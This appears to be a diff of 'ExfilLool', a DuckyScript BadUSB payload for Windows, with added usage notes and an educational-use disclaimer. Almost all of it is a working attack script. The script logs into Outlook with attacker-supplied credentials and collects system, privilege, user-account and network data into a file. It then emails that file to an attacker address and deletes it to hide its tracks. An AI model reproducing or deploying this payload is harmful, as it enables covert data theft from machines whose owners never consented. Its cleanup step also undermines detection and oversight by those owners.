@@ -1,3 +1,4 @@
+REM -
 REM -       wW    Ww      wW  Ww W  W   W  W       .-.        .-.           _  
 REM -   wWw(O)\  /(O)  wWw(O)(O)(O)(O) (O)(O)    c(O_O)c    c(O_O)c  (OO) .' ) 
 REM -   (O)_`. \/ .'   (O)_(..)   ||     ||     ,'.---.`,  ,'.---.`,  ||_/ .'  
@@ -5,13 +6,21 @@ REM -  .' __) \  /    .' __)||    | \    | \   / /|_|_|\ \/ /|_|_|\ \ |   /
 REM - (  _)   /  \   (  _) _||_   |  `.  |  `. | \_____/ || \_____/ | ||\ \    
 REM -  `.__).' /\ `.  )/  (_/\_) (.-.__)(.-.__)'. `---' .`'. `---' .`(/\)\ `.  
 REM -      (_.'  `._)(            `-'    `-'     `-...-'    `-...-'       `._) 
+REM -
 REM - by Jonmar Corpuz
 REM -------------------------- 
 
+REM - TOOL USAGE AND INFORMATION
 REM - ExfilLool is used as a BadUSB exploit written in DuckyScript that's used used to enumerate data from a compromised Windows system and exfiltrate that data through Outlook.
+REM - This tool doesn't require administrator privileges in order to successfully exfiltrate the enumerated data.
+REM - You need to first specify the destination Outlook.com email where you want the target machine to sent the data to as well as its corresponding password to allow the payload to log in to the account using Outlook if none exists on the target machine.
 REM -------------------------- 
 
-REM - Step 1: Add an Outlook account (If one already exists then the command won't really do anything)
+REM - DISCLAIMERS
+REM - This tools is made for educational purposes only and you should only test it on machines and systems that you have permission to test or personally own!
+REM -------------------------- 
+
+REM - Step 1: Add an Outlook account (If one already exists then the payload will just walk through the commands without changing anything)
 REM -------------------------- 
 
 DELAY 500
@@ -28,11 +37,11 @@ RIGHT
 DELAY 500
 ENTER
 DELAY 500
-STRING <EMAIL>
+STRING <ATTACKER EMAIL>
 DELAY 500
 ENTER
 DELAY 2000
-STRING <EMAIL'S PASSWORD>
+STRING <ATTACKER EMAIL'S PASSWORD>
 DELAY 500
 ENTER
 DELAY 2000
@@ -41,7 +50,7 @@ DELAY 500
 ALT F4
 REM -------------------------- 
 
-REM - Step 2: Open PowerShell.exe
+REM - Step 2: Launch PowerShell.exe 
 REM -------------------------- 
 
 DELAY 500
@@ -52,82 +61,82 @@ DELAY 500
 ENTER
 REM -------------------------- 
 
-REM - Step 3: Fetch target data 
+REM - Step 3: Enumerate the target data and redirect it to a text file
 REM -------------------------- 
 
 DELAY 2000
-STRING echo 'System information:' > Oops.txt
+STRING echo 'System information:' > FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING systeminfo >> Oops.txt
+STRING systeminfo >> FILENAME.txt
 DELAY 500 
 ENTER
 DELAY 500
-STRING echo '' >> Oops.txt
+STRING echo '' >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING echo 'Current user information:' >> Oops.txt
+STRING echo 'Current user information:' >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 700
-STRING echo '' >> Oops.txt
+STRING echo '' >> FILENAME.txt
 DELAY 500
 ENTER
 
 DELAY 500
-STRING whoami >> Oops.txt
+STRING whoami >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING whoami /priv >> Oops.txt
+STRING whoami /priv >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING echo '' >> Oops.txt
+STRING echo '' >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING echo 'List of users:' >> Oops.txt
+STRING echo 'List of users:' >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING echo '' >> Oops.txt
+STRING echo '' >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING wmic useraccount list >> Oops.txt
+STRING wmic useraccount list >> FILENAME.txt
 DELAY 500
 ENTER
 
 DELAY 500
-STRING echo '' >> Oops.txt
+STRING echo '' >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING echo 'Network addresses:' >> Oops.txt
+STRING echo 'Network addresses:' >> FILENAME.txt
 DELAY 500
 ENTER
 DELAY 500
-STRING arp -a >> Oops.txt
+STRING arp -a >> FILENAME.txt
 DELAY 500
 ENTER
 REM -------------------------- 
 
-REM - Step 4: Exfiltrate the generated text file containing the loot using Outlook
+REM - Step 4: Exfiltrate the text file containing the loot using Outlook
 REM -------------------------- 
 
 DELAY 500
-STRING $Oops = pwd
+STRING $PWD = pwd
 DELAY 500
 ENTER
 DELAY 500
-STRING $Oopsies = "$Oops\Oops.txt"
+STRING $ATTACHMENT = "$PWD\FILENAME.txt"
 DELAY 500
 ENTER
 DELAY 500
-STRING $outlook = new-object -comobject outlook.application
+STRING $outlook = New-Object -comobject outlook.application
 DELAY 500
 ENTER
 DELAY 500
@@ -135,18 +144,18 @@ STRING $email = $outlook.CreateItem(0)
 DELAY 500
 ENTER
 DELAY 500
-STRING $email.To = "<EMAIL>"
+STRING $email.To = "<ATTACKER EMAIL>"
 DELAY 500
 ENTER
 DELAY 500
-STRING $email.Subject = "Oops"
+STRING $email.Subject = "SUBJECT"
 DELAY 500
 ENTER
-STRING $email.Body = "Oops"
+STRING $email.Body = "BODY"
 DELAY 500
 ENTER
 DELAY 500
-STRING $email.Attachments.add($Oopsies)
+STRING $email.Attachments.add($ATTACHMENT)
 DELAY 500
 ENTER
 DELAY 500
@@ -159,11 +168,11 @@ DELAY 500
 ENTER
 REM -------------------------- 
 
-REM - Step 5: Erase our tracks from the compromised system
+REM - Step 5: Erase our tracks from the target machine
 REM -------------------------- 
 
 DELAY 500
-STRING del Oops.txt
+STRING del FILENAME.txt
 DELAY 500
 ENTER
 
@@ -173,6 +182,6 @@ DELAY 500
 ENTER
 REM -------------------------- 
 
+REM - ADDITIONAL COMMANDS
 REM - Check PowerShell History: Get-Content (Get-PSReadlineOption).HistorySavePath
-
-
+REM -------------------------- 
